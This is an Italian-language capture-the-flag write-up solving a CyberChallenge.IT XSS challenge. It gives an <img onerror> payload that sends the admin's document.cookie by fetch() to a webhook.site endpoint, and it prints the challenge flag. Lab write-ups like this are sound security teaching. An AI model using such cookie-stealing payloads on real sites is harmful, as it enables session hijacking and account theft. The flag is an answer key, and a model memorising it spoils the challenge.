# Writeup: WS_3.02 - XSS Simple 2

## Overview
- **Categoria**: Web  
- **Autore**: bonaff  
- **Difficoltà**: 485  
- **Stato**: Down (last checked: 6 minutes ago)  
- **URL**: [http://xss2.challs.cyberchallenge.it/](http://xss2.challs.cyberchallenge.it/)

## Descrizione 📝
Seconda sfida della serie di 5 challenge incentrate su **XSS**. L’obiettivo rimane quello di rubare il cookie dell’admin, inviandogli un link malevolo tramite il form di “report”. In questa sfida, la pagina tenta di caricare un’immagine con il nome fornito dal parametro `html`.

### Dinamica della Pagina
1. L’utente fornisce un valore per il parametro `html`.  
2. La pagina prova a caricare un’immagine con quel nome, ad esempio:  
   ```
   http://xss2.challs.cyberchallenge.it/?html=ciao
   ```
   genera la richiesta di un’immagine `http://xss2.challs.cyberchallenge.it/ciao`, che non esiste e produce un **404**.

## Soluzione 🎯

### 1. Exploit con `<img>` e `onerror`
Utilizziamo l’evento `onerror` di un tag `<img>` per eseguire JavaScript in caso di errore (immagine non trovata). Ad esempio:
```html
<img src="x" onerror="alert('XSS');">
```
Invece di `alert()`, possiamo eseguire un fetch verso un nostro endpoint (webhook) inviando il `document.cookie`.

### 2. Preparazione del Webhook
Creiamo un endpoint su [Webhook.site](https://webhook.site/) o servizio simile per ricevere i dati. Otterremo un URL univoco (ad esempio `https://webhook.site/7abedc77-d3eb-4ea9-8a94-f613d72088c8`).

### 3. Payload Finale
Nel form di “report”, costruiamo un URL che includa il nostro payload:
```
http://xss2.challs.cyberchallenge.it/report?url=http://xss2.challs.cyberchallenge.it/?html=<img src="x" onerror="fetch('https://webhook.site/7abedc77-d3eb-4ea9-8a94-f613d72088c8', {method: 'POST', body: document.cookie})">
```
In questo modo, quando l’admin carica il link segnalato, il browser tenterà di caricare un’immagine `x` (inesistente), genererà un errore e attiverà `onerror`, inviando il cookie dell’admin al nostro webhook tramite `fetch()`.

### 4. Raccolta della Flag
Controllando i log del webhook, vedremo una richiesta con il `document.cookie`, contenente la flag:

## Flag 🏁
```
CCIT{2c161cc0bca1642c0357385e721b1e98}
```

## Lezioni Apprese 📚
1. **XSS tramite `<img onerror>`**: Un classico vettore per eseguire JavaScript in caso di mancato caricamento di un’immagine.  
2. **Payload con `fetch()`**: Alternativa moderna a `document.location` o `XMLHttpRequest` per inviare dati a un endpoint esterno.  
3. **Validazione di Parametri**: Se la pagina carica risorse basate su input non sanitizzato, diventa facile iniettare script malevoli.

## Tools Utilizzati 🛠️
- **Browser Web**: Per costruire e testare il payload.  
- **Webhook.site**: Per ricevere i cookie dell’admin.  
- **Dev Tools**: Per monitorare le richieste e le risposte HTTP.

---

*Writeup by Luca Crippa - Last Updated: 2024*
